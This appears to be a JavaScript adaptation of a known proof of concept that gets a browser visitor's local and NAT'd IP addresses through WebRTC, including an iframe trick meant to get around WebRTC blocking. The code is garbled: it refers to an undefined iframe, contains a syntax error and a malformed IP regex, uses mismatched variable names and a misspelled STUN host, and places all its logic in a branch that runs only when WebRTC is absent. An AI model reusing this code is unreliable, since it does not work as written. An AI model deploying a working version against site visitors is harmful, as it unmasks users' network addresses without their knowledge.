/*
Utilizing Daniel Roesler's POC for WebRTC nat'd IP address retrieval
over WebRTC

*/
  

var RTCPeerConnection = window.RTCPeerConnection
      || window.mozRTCPeerConnection
      || window.webkitRTCPeerConnection;
var useWebKit = !!window.webkitRTCPeerConnection;

//iframe roundabout for webrtc blocking
if(!RTCPeerConnection){



  var win = iframe.contentWindow;
  RTCPeerConnection = win.RTCPeerConnection
          || win.mozRTCPeerConnection
          || win.webkitRTCPeerConnection;
  useWebKit = !!win.webkitRTCPeerConnection;

  var mediaConstraints = {
     optional : [{RtpDataChannels:true}];
  };

  var servers = {iceServers :[{urls: "stun:stun.services.mozzila.com"}]};

  var pc = new RTCPeerConnection(servers,mediaConstraints);
  function handlerCandidate(candidate){
    var ip_regex = /([0-9]{1,3}(\.[0-9){1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
    var ip_address = ip_regex.exec(candidate);

    if(ip_dips[ip_addr]==undefined)
      callback(ip_addr);
    ip_dups[ip_addr]=true;

  }

  pc.onicecandidate = function(ice){

    if(ice.candidate)
      handlerCandidate(ice.candidate.candidate);
  };

  pc.createDataChannel("");

  pc.createOffer(function(result){
      pc.setLocalDescription(result,function(){},function(){});



  },function(){});

  setTimeout(function(){
      var lines = pc.localDescription.sdp.split('\n');
      lines.forEach(function(line){
        if(line.indexOf('a=candidate:')===0)
          handlerCandidate(line);
      });


  },1000);

}
